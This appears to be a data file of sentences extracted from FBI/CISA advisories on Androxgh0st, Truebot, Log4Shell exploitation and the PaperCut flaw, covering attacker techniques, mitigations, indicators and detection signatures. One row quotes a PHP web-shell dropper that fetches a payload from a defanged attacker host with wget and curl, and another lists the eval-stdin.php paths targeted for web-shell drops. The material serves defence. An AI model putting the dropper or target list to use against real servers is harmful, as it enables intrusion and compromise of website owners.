CAND_00371,R008,5,R008_P0002,R008_S000052,FBI | CISA Page 5 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR • /laravel/.env%20 • /shared/.env%20 • /.env.project%20 • /apps/.env%20 • /development/.env%20 • /live_env%20 • /.env.development%20 Targeted URIs for web-shell drop: • /.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //lib/phpunit/phpunit/Util/PHP/eval-stdin.php • //lib/phpunit/src/Util/PHP/eval-stdin.php • //lib/phpunit/Util/PHP/eval-stdin.php • //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //phpunit/phpunit/src/Util/PHP/eval-stdin.php • //phpunit/phpunit/Util/PHP/eval-stdin.php • //phpunit/src/Util/PHP/eval-stdin.php • //phpunit/Util/PHP/eval-stdin.php • //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstd in.php • //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php • //vendor/phpunit/src/Util/PHP/eval-stdin.php • //vendor/phpunit/Util/PHP/eval-stdin.php • //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval- stdin.php • //wp-content/plugins/dzs- videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
CAND_00372,R008,7,R008_P0004,R008_S000056,"<?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seofor ce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?> Monikers used instead of Androxgh0st (0x%5B%5D=???): • Ridho • Aws • 0x_0x • x_X • nopebee7 • SMTPEX • evileyes0 • privangga"
CAND_00373,R008,8,R008_P0004,R008_S000059,hxxp://download.asyncfox[.]xyz/download/xmrig.x86_64 23fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066
CAND_00374,R008,8,R008_P0005,R008_S000060,hxxps://pastebin[.]com/raw/zw0gAmpC ca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72
CAND_00375,R008,8,R008_P0008,R008_S000063,hxxp://main.dsn[.]ovh/dns/pwer bb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7
CAND_00376,R008,9,R008_P0002,R008_S000066,Table 1: Reconnaissance Technique Title ID Use Active Scanning: Vulnerability Scanning T1595.002 The threat actor scans websites for specific vulnerabilities to exploit.
CAND_00377,R008,9,R008_P0002,R008_S000067,Table 2: Resource Development Technique Title ID Use Acquire Infrastructure: Botnet T1583.005 The threat actor establishes a botnet to identify and exploit victims.
CAND_00378,R008,10,R008_P0002,R008_S000071,FBI | CISA Page 10 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR Table 5: Persistence Technique Title ID Use Valid Accounts T1078 The threat actor abuses the simple mail transfer protocol (SMTP) by exploiting exposed credentials.
CAND_00379,R008,10,R008_P0002,R008_S000072,Server Software Component: Web Shell T1505.003 The threat actor deploys web shells to maintain persistent access to systems.
CAND_00380,R008,10,R008_P0002,R008_S000076,Unsecured Credentials: Credentials in Files T1552.001 The threat actor targets .env files that contain confidential credential information.
CAND_00381,R008,11,R008_P0002,R008_S000078,FBI | CISA Page 11 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR Technique Title ID Use Network Service Discovery T1046 The threat actor uses Androxgh0st to abuse simple mail transfer protocol (SMTP) via scanning.
CAND_00382,R008,11,R008_P0002,R008_S000079,Table 9: Collection Technique Title ID Use Email Collection T1114 The threat actor interacts with application programming interfaces (APIs) to gather information.
CAND_00383,R008,11,R008_P0002,R008_S000080,Table 10: Command and Control Technique Title ID Use Ingress Tool Transfer T1105 The threat actor runs PHP code through a POST request to download malicious files to the system hosting the website.
CAND_00384,R008,11,R008_P0002,R008_S000084,"CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures."
CAND_00385,R008,11,R008_P0002,R008_S000087,"FBI and CISA recommend that software manufacturers incorporate secure by design principles and tactics into their software development practices, limiting the impact of actor techniques and strengthening their customers’ security posture."
CAND_00386,R008,11,R008_P0002,R008_S000091,"Specifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50."
CAND_00387,R008,12,R008_P0002,R008_S000095,• Verify that the default configuration for all URIs is to deny all requests unless there is a specific need for it to be accessible.
CAND_00388,R008,12,R008_P0002,R008_S000096,• Ensure that any live Laravel applications are not in “debug” or testing mode.
CAND_00389,R008,12,R008_P0002,R008_S000099,"• On a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the .env file for unauthorized access or use."
CAND_00390,R008,12,R008_P0002,R008_S000101,"• Review outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc., particularly when the request accesses a .php file."
CAND_00391,R008,12,R008_P0002,R008_S000107,Align your security technologies against the technique.
CAND_00392,R008,12,R008_P0002,R008_S000108,3.
CAND_00393,R008,12,R008_P0002,R008_S000109,Test your technologies against the technique.
CAND_00394,R008,12,R008_P0002,R008_S000113,Repeat the process for all security technologies to obtain a set of comprehensive performance data.
CAND_00395,R008,12,R008_P0002,R008_S000114,6.
CAND_00396,R008,12,R008_P0002,R008_S000115,"Tune your security program, including people, processes, and technologies, based on the data generated by this process."
CAND_00397,R008,12,R008_P0002,R008_S000117,REPORTING The FBI encourages organizations to report information concerning suspicious or criminal activity to their local FBI field office.
CAND_00398,R008,12,R008_P0002,R008_S000118,"With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation."
CAND_00399,R008,13,R008_P0002,R008_S000124,"Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA."
CAND_00400,R008,13,R008_P0002,R008_S000125,"VERSION HISTORY January 16, 2024: Initial version."
CAND_00401,R009,1,R009_P0004,R009_S000016,"The authoring organizations recommend hunting for the malicious activity using the guidance outlined in this CSA, as well as applying vendor patches to Netwrix Auditor (version 10.5—see Mitigations section below).[1] Any organization identifying indicators of compromise (IOCs) within their environment should urgently apply the incident responses and mitigation measures detailed in this CSA and report the intrusion to CISA or the FBI."
CAND_00402,R009,2,R009_P0001,R009_S000017,CISA | FBI | MS-ISAC| CCCS Page 2 of 25 | Product ID: AA23-187A TLP:CLEAR TLP:CLEAR Read the associated Malware Analysis Report: MAR-10445155-1.v1 Truebot Activity Infects U.S.
CAND_00403,R009,3,R009_P0003,R009_S000035,Please see the Cobalt Strike section below for more information on how this remote access tool (RAT) is used in Truebot operations.
CAND_00404,R009,3,R009_P0003,R009_S000038,"Based on IOCs in table 1, Truebot also has the ability to discover software security protocols and system time metrics, which aids in defense evasion, as well as enables synchronization with the compromised system’s internal clock to facilitate scheduling tasks [T1518.001][T1124]."
CAND_00405,R009,4,R009_P0003,R009_S000054,"Teleport (Tool) Cyber threat actors have been observed using a custom data exfiltration tool, which Talos has named “Teleport.”[2] Teleport is known to evade detection during data exfiltration by using an encryption key hardcoded in the binary and a custom communication protocol [T1095] that encrypts data using advanced encryption standard (AES) and a hardcoded key [T1048][T1573.002]."
CAND_00406,R009,5,R009_P0003,R009_S000061,Note: these IOCs are associated with Truebot campaigns used by Graceful Spider to deliver FlawedGrace and LummaStealer payloads in May of 2023.
CAND_00407,R009,9,R009_P0006,R009_S000075,midnigthwaall[.]com 46.161.40[.]128
CAND_00408,R009,9,R009_P0009,R009_S000078,dremmfyttrred[.]com 45.182.189[.]103 hxxps://dremmfyttrred[.]com/dns[.]php ms-online-store[.]com 45.227.253[.]102
CAND_00409,R009,10,R009_P0004,R009_S000083,romidonion hhgtt[.]com
CAND_00410,R009,10,R009_P0007,R009_S000087,]com 9a3bad7d851621669 5887acc9668cda1 a89c097138e5aab1f35b9 a03900600057d907690 4862618fcf15ba4ad15df35a8dcb0bdb796 47b455fea6c6937c7d050815494b0 essadonio[.
CAND_00411,R009,12,R009_P0003,R009_S000103,]com 587acecdb9491e089 7d1067eb02e7c8d a9eb1ac4b85d17da3a2ba e5835c7e862d481c189 55d1480cd023b74f10692c689b56e7fd6cc 8139fb6322762181daead55a62b9e nefosferta[.
CAND_00412,R009,12,R009_P0003,R009_S000107,]com e9115cc3280c16f90 19e0054e059f4b8 dad01b0c745649c6c8b87 dbeb7ab549ed039515d 7a64bc69b60e3cd3fd00d4424b41139446 5640f499e56563447fe70579ccdd00 nefosferta[.
CAND_00413,R009,12,R009_P0003,R009_S000116,]com c87fb9b9f6c343670b ed605420583418 f05cf0b026b2716927dac8 bcd26a2719ea328964 c6c4f690f0d15b96034b4258bdfaf797432 a3ec4f73fbc920384d27903143cb0 nefosferta[.
CAND_00414,R009,13,R009_P0003,R009_S000119,TLP:CLEAR TLP:CLEAR
CAND_00415,R009,14,R009_P0003,R009_S000134,Drive-by Compromise T1189 Cyber threat actors embed malicious links or attachments within web domains to gain initial access.
CAND_00416,R009,14,R009_P0003,R009_S000136,Phishing T1566.002 Truebot actors can send spear phishing links to gain initial access.
CAND_00417,R009,14,R009_P0004,R009_S000139,Shared Modules T1129 Cyber threat actors can deploy malicious payloads through obfuscated share modules.
CAND_00418,R009,15,R009_P0004,R009_S000143,"Table 8: Persistence Technique Title ID Use Hijack Execution Flow: DLL Side-Loading 1574.002 Cyber threat actors use Raspberry Robin, among other toolsets to side-load DLLs to maintain persistence."
CAND_00419,R009,15,R009_P0005,R009_S000144,Table 9: Privilege Escalation Technique Title ID Use Boot or Logon Autostart Execution: Print Processors T1547.012 FlawedGrace malware manipulates print spooler functions to achieve privilege escalation.
CAND_00420,R009,15,R009_P0006,R009_S000145,"Table 10: Defense Evasion Technique Title ID Use Obfuscated Files or Information T1027 Truebot uses a .JSONIP extension (e.g., IgtyXEQuCEvAM.JSONIP), to create a GUID."
CAND_00421,R009,16,R009_P0004,R009_S000154,Table 11: Credential Access Technique Title ID Use OS Credential Dumping: LSASS Memory T1003.001 Cyber threat actors use cobalt strike to gain valid credentials through LSASS memory dumping.
CAND_00422,R009,17,R009_P0005,R009_S000167,Table 14: Collection Technique Title ID Use Data from Local System T1005 Truebot malware checks the current version of the OS and the processor architecture and compiles the information it receives.
CAND_00423,R009,18,R009_P0002,R009_S000168,CISA | FBI | MS-ISAC| CCCS Page 18 of 25 | Product ID: AA23-187A
CAND_00424,R009,19,R009_P0003,R009_S000179,TLP:CLEAR TLP:CLEAR Cyber threat actors use the Teleport tool to exfiltrate data over a C2 protocol.
CAND_00425,R009,19,R009_P0006,R009_S000183,"Figure 3: YARA Rule for Detecting Truebot Malware rule CISA_10445155_01 : TRUEBOT downloader { meta: Author = ""CISA Code & Media Analysis"" Incident = ""10445155"" Date = ""2023-05-17"" Last_Modified = ""20230523_1500"" Actor = ""n/a"" Family = ""TRUEBOT"" Capabilities = ""n/a"" Malware_Type = ""downloader"" Tool_Type = ""n/a"""
CAND_00426,R009,20,R009_P0004,R009_S000188,2.
CAND_00427,R009,20,R009_P0004,R009_S000192,4.
CAND_00428,R009,20,R009_P0004,R009_S000195,Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888- 282-0870) or contact your local FBI field office.
CAND_00429,R009,20,R009_P0004,R009_S000197,"MITIGATIONS CISA and the authoring organizations recommend organizations implement the below mitigations, including mandating phishing-resistant multifactor authentication (MFA) for all staff and services."
CAND_00430,R009,21,R009_P0003,R009_S000204,o Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software.
CAND_00431,R009,21,R009_P0003,R009_S000206,"Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation."
CAND_00432,R009,21,R009_P0003,R009_S000210,o Enforce account lockouts after a specified number of attempts.
CAND_00433,R009,21,R009_P0003,R009_S000212,o Log RDP login attempts.
CAND_00434,R009,21,R009_P0003,R009_S000213,• Disable command-line and scripting activities and permissions [CPG 2.N].
CAND_00435,R009,21,R009_P0003,R009_S000216,• Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions.
CAND_00436,R009,21,R009_P0003,R009_S000218,"• Enable enhanced PowerShell logging [CPG 2.T, 2.U]."
CAND_00437,R009,21,R009_P0003,R009_S000219,"o PowerShell logs contain valuable data, including historical OS and registry interaction and possible IOCs of a cyber threat actor’s PowerShell use."
CAND_00438,R009,21,R009_P0003,R009_S000220,"o Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging)."
CAND_00439,R009,21,R009_P0003,R009_S000223,These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off.
CAND_00440,R009,22,R009_P0003,R009_S000237,"In addition, CISA, FBI, MS-ISAC, and CCCS recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors: • Disable File and Printer sharing services."
CAND_00441,R009,22,R009_P0003,R009_S000245,o Add password user “salts” to shared login credentials.
CAND_00442,R009,22,R009_P0003,R009_S000246,o Avoid reusing passwords [CPG 2.C].
CAND_00443,R009,22,R009_P0003,R009_S000247,o Implement multiple failed login attempt account lockouts [CPG 2.G].
CAND_00444,R009,23,R009_P0003,R009_S000249,TLP:CLEAR TLP:CLEAR o Disable password “hints.” o Refrain from requiring password changes more frequently than once per year.
CAND_00445,R009,23,R009_P0003,R009_S000252,o Require administrator credentials to install software.
CAND_00446,R009,23,R009_P0003,R009_S000266,"• Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R]."
CAND_00447,R009,23,R009_P0003,R009_S000267,"VALIDATE SECURITY CONTROLS In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."
CAND_00448,R009,24,R009_P0003,R009_S000284,ransomware resources and alerts.) • #StopRansomware Guide • CISA: Implement Phishing-Resistant MFA • CISA: Guide to Securing Remote Access Software • CISA and MS-ISAC: Joint Ransomware Guide • CISA: Cross-Sector Cybersecurity Performance Goals • CL0P Ransomware Uses Truebot Malware for Access to Networks • Field Offices – FBI • NSA – Zero Trust Security Model
CAND_00449,R009,25,R009_P0003,R009_S000290,| PaperCut ACKNOWLEDGEMENTS VMware’s Carbon Black contributed to this CSA.
CAND_00450,R009,25,R009_P0003,R009_S000291,DISCLAIMER The information in this report is being provided “as is” for informational purposes only.
CAND_00451,R010,1,R010_P0002,R010_S000010,"In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence."
CAND_00452,R010,1,R010_P0002,R010_S000012,"CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises."
CAND_00453,R010,1,R010_P0002,R010_S000013,CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities.
CAND_00454,R010,2,R010_P0001,R010_S000018,``
CAND_00455,R010,2,R010_P0002,R010_S000021,"Overview In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network."
CAND_00456,R010,2,R010_P0002,R010_S000023,"In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity."
CAND_00457,R010,2,R010_P0002,R010_S000026,"Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address."
CAND_00458,R010,2,R010_P0002,R010_S000031,"The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies."
CAND_00459,R010,3,R010_P0001,R010_S000035,``
CAND_00460,R010,3,R010_P0002,R010_S000041,This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].
CAND_00461,R010,3,R010_P0002,R010_S000042,The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.
CAND_00462,R010,3,R010_P0002,R010_S000043,"Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access."
CAND_00463,R010,3,R010_P0002,R010_S000046,"After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host."
CAND_00464,R010,3,R010_P0003,R010_S000057,"The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com"
CAND_00465,R010,4,R010_P0002,R010_S000062,"Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed."
CAND_00466,R010,5,R010_P0002,R010_S000074,Mitigation: Use multifactor authentication for user and privileged accounts [M1032].
CAND_00467,R010,6,R010_P0002,R010_S000083,Create Account: Domain Account T1136.002 The actors used Mimikatz to create a rogue domain administrator account.
CAND_00468,R010,6,R010_P0002,R010_S000084,Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.
CAND_00469,R010,6,R010_P0002,R010_S000087,Mitigation: Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM [M1028].
CAND_00470,R010,6,R010_P0002,R010_S000088,Detection: Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [DS0009] Detection: Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows- TaskScheduler/Operational setting within the event logging service [DS0003].
CAND_00471,R010,6,R010_P0002,R010_S000090,Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [M1027].
CAND_00472,R010,7,R010_P0002,R010_S000092,CISA | FBI TLP:CLEAR Page 7 of 14 | Product ID: AA22-320A TLP:CLEAR Detection: Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028].
CAND_00473,R010,7,R010_P0003,R010_S000096,The actors manually disabled Windows Defender via the GUI.
CAND_00474,R010,7,R010_P0003,R010_S000097,Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
CAND_00475,R010,7,R010_P0003,R010_S000103,"Detection: Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017]."
CAND_00476,R010,8,R010_P0002,R010_S000105,CISA | FBI TLP:CLEAR Page 8 of 14 | Product ID: AA22-320A TLP:CLEAR Detection: Monitor for unexpected deletion of files from the system [DS0022].
CAND_00477,R010,9,R010_P0001,R010_S000113,``
CAND_00478,R010,10,R010_P0002,R010_S000125,"Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping) [DS0009] that may check for internet connectivity on compromised systems."
CAND_00479,R010,10,R010_P0002,R010_S000126,Lateral Movement Technique Title ID Use Recommendations Remote Services: Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network.
CAND_00480,R010,11,R010_P0002,R010_S000138,"Detection: Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure) [DS0029]."
CAND_00481,R010,11,R010_P0003,R010_S000142,"CISA recommends organizations apply the following steps before applying any mitigations, including patching."
CAND_00482,R010,11,R010_P0003,R010_S000146,"Collect and review relevant logs, data, and artifacts."
CAND_00483,R010,12,R010_P0002,R010_S000153,MITIGATIONS CISA and FBI recommend implementing the mitigations below and in table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors.
CAND_00484,R010,12,R010_P0002,R010_S000162,Implement temporary solutions using an account with administrative privileges.
CAND_00485,R010,12,R010_P0002,R010_S000163,Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible.
CAND_00486,R010,12,R010_P0002,R010_S000164," Prior to implementing any temporary solution, ensure appropriate backups have been completed."
CAND_00487,R010,12,R010_P0002,R010_S000166,See KB87073 for details.
CAND_00488,R010,13,R010_P0002,R010_S000173,"Disable inactive accounts uniformly across the AD, MFA systems, etc."
CAND_00489,R010,13,R010_P0002,R010_S000178,Administrator accounts should have the minimum permission necessary to complete their tasks.
CAND_00490,R010,13,R010_P0002,R010_S000179,o Ensure there are unique and distinct administrative accounts for each set of administrative tasks.
CAND_00491,R010,13,R010_P0002,R010_S000183,o Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
CAND_00492,R010,13,R010_P0002,R010_S000184,o Ensure storage of clear text passwords in LSASS memory is disabled.
CAND_00493,R010,13,R010_P0002,R010_S000185,"Note: For Windows 8, this is enabled by default."
CAND_00494,R010,13,R010_P0002,R010_S000188,o Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information).
CAND_00495,R010,13,R010_P0002,R010_S000191,Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack.
CAND_00496,R010,14,R010_P0002,R010_S000195,CISA | FBI TLP:CLEAR Page 14 of 14 | Product ID: AA22-320A TLP:CLEAR To get started: 1.
CAND_00497,R010,14,R010_P0002,R010_S000197,2.
CAND_00498,R010,14,R010_P0002,R010_S000200,Test your technologies against the technique.
CAND_00499,R010,14,R010_P0002,R010_S000205,6.
CAND_00500,R010,14,R010_P0002,R010_S000206,"Tune your security program, including people, processes, and technologies, based on the data generated by this process."
CAND_00501,R011,1,R011_P0001,R011_S000001,"To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870."
CAND_00502,R011,1,R011_P0001,R011_S000006,"For more information on the Traffic Light Protocol, see cisa.gov/tlp."
CAND_00503,R011,1,R011_P0001,R011_S000011,"In early May 2023, also according to FBI information, a group self-identifying as the Bl00dy Ransomware Gang attempted to exploit vulnerable PaperCut servers against the Education Facilities Subsector."
CAND_00504,R011,1,R011_P0001,R011_S000014,FBI and CISA especially encourage organizations who did not patch immediately to assume compromise and hunt for malicious activity using the detection signatures in this CSA.
CAND_00505,R011,1,R011_P0001,R011_S000016,"For a downloadable copy of IOCs, see AA23-131A.stix (STIX, 55 kb)."
CAND_00506,R011,1,R011_P0001,R011_S000017,TECHNICAL DETAILS Vulnerability Overview CVE-2023-27350 allows a remote actor to bypass authentication and conduct remote code execution on the following affected installations of PaperCut:[1] • Version 8.0.0 to 19.2.7 • Version 20.0.0 to 20.1.6 • Version 21.0.0 to 21.2.10 • Version 22.0.0 to 22.0.8
CAND_00507,R011,2,R011_P0002,R011_S000018,FBI  CISA Page 2 of 13 | Product ID: AA23-131A
CAND_00508,R011,2,R011_P0003,R011_S000019,"TLP:CLEAR TLP:CLEAR PaperCut servers vulnerable to CVE-2023-27350 implement improper access controls in the SetupCompleted Java class, allowing malicious actors to bypass user authentication and access the server as an administrator."
CAND_00509,R011,2,R011_P0003,R011_S000020,"After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE)."
CAND_00510,R011,2,R011_P0004,R011_S000024,The PaperCut server process pc-app.exe runs with SYSTEM- or root-level privileges.
CAND_00511,R011,2,R011_P0004,R011_S000026,Commands supplied with the execution of these processes will also run with the same privileges.
CAND_00512,R011,2,R011_P0004,R011_S000028,"This CVE was added to CISA’s Known Exploited Vulnerabilities (KEV) Catalog on April 21, 2023."
CAND_00513,R011,3,R011_P0004,R011_S000037,"The FBI also identified information relating to the download and execution of command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons, although it is unclear at which stage in the attack these tools were executed."
CAND_00514,R011,4,R011_P0003,R011_S000041,TLP:CLEAR TLP:CLEAR • Server settings and log files – Look for evidence of malicious activity in PaperCut server settings and log files.
CAND_00515,R011,4,R011_P0003,R011_S000043,Deploy the following Emerging Threat Suricata signatures to detect when GET requests are sent to the SetupCompleted page.
CAND_00516,R011,4,R011_P0003,R011_S000044,(Be careful of improperly formatted double-quotation marks if copying and pasting signatures from this advisory.) Note that some of the techniques identified in this section can affect the availability or stability of a system.
CAND_00517,R011,4,R011_P0003,R011_S000045,Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while threat hunting.
CAND_00518,R011,4,R011_P0005,R011_S000048,"Note that these signatures and other rule-based detections, including YARA rules, may fail to detect more advanced iterations of CVE-2023-27350 exploits."
CAND_00519,R011,4,R011_P0005,R011_S000049,Actors are known to adapt exploits to circumvent rule-based detections formulated for the original iterations of exploits observed in the wild.
CAND_00520,R011,4,R011_P0005,R011_S000050,"For example, the first rule above detected some of the first known exploits of CVE-2023-27350, but a"
CAND_00521,R011,6,R011_P0002,R011_S000058,FBI  CISA Page 6 of 13 | Product ID: AA23-131A
CAND_00522,R011,6,R011_P0003,R011_S000059,"TLP:CLEAR TLP:CLEAR dns_query; content:""windowservicecemter.com""; nocase; isdataat:!1,relative; pcre:""/(?:^|\.)windowservicecemter\.com$/""; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut- print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)"
CAND_00523,R011,6,R011_P0005,R011_S000061,"alert dns $HOME_NET any -> any any (msg:""ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (netviewremote .com)""; dns_query; content:""netviewremote.com""; nocase; isdataat:!1,relative; pcre:""/(?:^|\.)netviewremote\.com$/""; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut- print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)"
CAND_00524,R011,7,R011_P0002,R011_S000063,FBI  CISA Page 7 of 13 | Product ID: AA23-131A
CAND_00525,R011,7,R011_P0005,R011_S000066,"alert dns $HOME_NET any -> any any (msg:""ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecentar .com)""; dns_query; content:""windowservicecentar.com""; nocase; isdataat:!1,relative; pcre:""/(?:^|\.)windowservicecentar\.com$/""; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut- print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category ATTACK_RESPONSE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) Note that these signatures may also not work if the actor modified activity to evade detection by known rules."
CAND_00526,R011,9,R011_P0002,R011_S000077,FBI  CISA Page 9 of 13 | Product ID: AA23-131A
CAND_00527,R011,9,R011_P0003,R011_S000078,TLP:CLEAR TLP:CLEAR Table 1: Bl00dy Gang Ransomware Email Addresses Email Addresses decrypt.support@privyonline[.]com fimaribahundqf@gmx[.]com main-office@data-highstream[.]com prepalkeinuc0u@gmx[.]com tpyrcne@onionmail[.]org
CAND_00528,R011,9,R011_P0004,R011_S000079,Table 2: Bl00dy Gang Ransomware Tox ID Tox ID E3213A199CDA7618AC22486EFECBD9F8E049AC36094D56AC1BFBE67EB9C3CF2352CAE9E BD35F
CAND_00529,R011,9,R011_P0005,R011_S000080,Table 3: Bl00dy Gang Ransomware IP addresses IP Address Port Date Description 102.130.112[.]157 - April 2023 N/A 172.106.112[.]46 - April 2023 Resolves to Tor node.
CAND_00530,R011,9,R011_P0005,R011_S000081,Network communications with nethelper.exe.
CAND_00531,R011,9,R011_P0005,R011_S000082,176.97.76[.]163 - April 2023 Resolves to datacenter Tor node.
CAND_00532,R011,9,R011_P0005,R011_S000083,192.160.102[.]164
CAND_00533,R011,9,R011_P0007,R011_S000092,Network communications with nethelper.exe.
CAND_00534,R011,9,R011_P0007,R011_S000093,206.197.244[.]75 443 April 2023 N/A 216.122.175[.]114
CAND_00535,R011,9,R011_P0009,R011_S000096,April 2023 Resolves to Tor node.
CAND_00536,R011,9,R011_P0009,R011_S000097,Network communications with nethelper.exe.
CAND_00537,R011,10,R011_P0003,R011_S000099,TLP:CLEAR TLP:CLEAR 5.188.206[.]14 - April 2023 N/A 5.8.18[.]233 - April 2023 Cobalt Strike C2.
